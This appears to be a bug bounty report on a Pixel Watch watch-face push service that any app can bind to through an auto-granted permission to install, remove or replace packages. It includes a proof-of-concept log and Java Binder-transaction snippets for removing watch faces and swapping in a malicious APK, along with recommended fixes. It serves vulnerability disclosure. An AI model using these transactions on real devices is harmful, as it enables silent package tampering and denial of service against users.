# VRP Report #47: WatchFace Push API — Unauthorized Package Installation/Removal via Normal Permission

## Vulnerability Summary
The `WatchFaceReceiverService` in `com.google.android.wearable.dwf.receiver` is protected only by `com.google.wear.permission.PUSH_WATCH_FACES`, a **normal** protection level permission that is auto-granted at install time without user consent. The DWF receiver app holds `INSTALL_PACKAGES` and `DELETE_PACKAGES` permissions. Any installed app can bind to this service and push arbitrary watch face APKs (triggering installation), remove existing watch faces (triggering uninstallation), or update/replace watch faces — all without the user's knowledge or consent.

## Affected Component
- **Package**: `com.google.android.wearable.dwf.receiver`
- **Service**: `WatchFaceReceiverService` (exported=true)
- **Intent Action**: `com.google.wear.ACTION_PUSH_WATCH_FACES`
- **Permission**: `com.google.wear.permission.PUSH_WATCH_FACES` (prot=**normal**, auto-granted)
- **AIDL Interface**: `com.google.wear.services.watchfaces.watchfacepush.IWatchFacePushApi`
- **Device**: Pixel Watch 2 (eos, CP2A.260603.001, June 2026 patches)

## Root Cause

### Weak Permission Protection
In the DWF receiver manifest:
```xml
<service android:enabled="true" android:exported="true"
    android:name="...WatchFaceReceiverService"
    android:permission="com.google.wear.permission.PUSH_WATCH_FACES">
    <intent-filter>
        <action android:name="com.google.wear.ACTION_PUSH_WATCH_FACES"/>
    </intent-filter>
</service>
```

The permission is defined with `prot=normal`:
```
Permission [com.google.wear.permission.PUSH_WATCH_FACES]:
    sourcePackage=com.google.wear.services
    uid=1000 prot=normal
```

Normal permissions are auto-granted at install time — no user prompt, no runtime permission dialog.

### Privileged Operations Exposed
The DWF receiver holds dangerous system permissions:
```xml
<uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
<uses-permission android:name="android.permission.DELETE_PACKAGES"/>
<uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
```

## Exposed API Operations (AIDL)

| Transaction | Method | Parameters | Permission |
|------------|--------|-----------|------------|
| 2 | addWatchFace | ParcelFileDescriptor (APK), String (watchFaceId), IAddWatchFaceCallback | PUSH_WATCH_FACES (normal) |
| 3 | removeWatchFace | String (watchFaceId), IRemoveWatchFaceCallback | PUSH_WATCH_FACES (normal) |
| 4 | updateWatchFace | ParcelFileDescriptor (APK), String (oldId), String (newId), IUpdateWatchFaceCallback | PUSH_WATCH_FACES (normal) |
| 5 | listWatchFaceSlots | IListWatchFaceSlotsCallback | PUSH_WATCH_FACES (normal) |
| 6 | isWatchFaceActive | String (watchFaceId), IIsWatchFaceActiveCallback | PUSH_WATCH_FACES (normal) |
| 7 | setActiveWatchFace | String (watchFaceId), ISetActiveWatchFaceCallback | **SET_PUSHED_WATCH_FACE_AS_ACTIVE** (dangerous) |

Only `setActiveWatchFace` requires a dangerous runtime permission. All other operations — including **package installation and removal** — need only the auto-granted normal permission.

## Dynamic Proof
PoC running as **UID 10156** (zero-permission app), verified on 2026-09-10:

```
Binding to WatchFaceReceiverService...
bindService() returned true, waiting for connection...
BOUND to: com.google.android.wearable.dwf.receiver/com.google.android.wearable.dwf.receiver.WatchFaceReceiverService
Service binder: android.os.BinderProxy

--- Transaction 5: listWatchFaceSlots ---
listWatchFaceSlots transact result: true
listSlots callback: code=2 (success/data)
  Callback data remaining: 16 bytes

--- Transaction 6: isWatchFaceActive ---
isWatchFaceActive(com.google.android.wearable.watchface.rwf) transact: true
isWatchFaceActive(com.google.android.apps.wearable.watchface.analog) transact: true
isWatchFaceActive(test_nonexistent_id) transact: true

Service binding: SUCCESSFUL (zero-permission app)
```

## Attack Scenarios

### 1. Silent Malicious Watch Face Installation
An attacker app pushes a watch face APK that:
- Mimics the system UI to phish for PIN/pattern input
- Requests complication data (health, calendar, contacts) via the watch face complications API
- Exfiltrates data via network when the watch face renders

### 2. Watch Face Denial of Service
An attacker repeatedly removes user-installed watch faces:
```java
// Any app can remove watch faces without user consent
Parcel data = Parcel.obtain();
data.writeInterfaceToken(DESCRIPTOR);
data.writeString(targetWatchFaceId);
data.writeStrongBinder(callback);
service.transact(3, data, null, FLAG_ONEWAY); // removeWatchFace
```

### 3. Watch Face Replacement (Supply Chain Attack)
An attacker updates an existing legitimate watch face with a modified malicious version:
```java
// Replace existing watch face APK
Parcel data = Parcel.obtain();
data.writeInterfaceToken(DESCRIPTOR);
data.writeParcelable(maliciousApkFd, 0);
data.writeString(existingWatchFaceId);
data.writeString(existingWatchFaceId);
data.writeStrongBinder(callback);
service.transact(4, data, null, FLAG_ONEWAY); // updateWatchFace
```

## Impact
- **Integrity**: HIGH
  - Unauthorized package installation on the device
  - Unauthorized package removal from the device
  - Watch face replacement/tampering
  - The DWF receiver runs with INSTALL_PACKAGES + DELETE_PACKAGES — these are system-level capabilities exposed through a normal permission
- **Availability**: MEDIUM
  - Can remove all user-installed watch faces
  - Can flood the device with unwanted watch faces
- **Confidentiality**: MEDIUM
  - Watch faces have access to complication data (health metrics, calendar events, contact info)
  - Can enumerate which watch faces are installed and active
  - Pushed watch faces execute code on the device

## Recommended Fix
1. **Elevate `PUSH_WATCH_FACES` to `dangerous` or `signature` protection level** — package installation/removal should never be gated by a normal permission
2. **Add user confirmation** before installing or removing watch face packages
3. **Validate watch face APK signatures** before installation (only allow signed watch faces from trusted sources)
4. **Rate-limit push operations** to prevent flooding

## PoC Files
- `poc_app/src/com/vrp/poc/WatchFacePushPocActivity.java`
- `dynamic_evidence/watchface_push_poc.log` (26 lines)
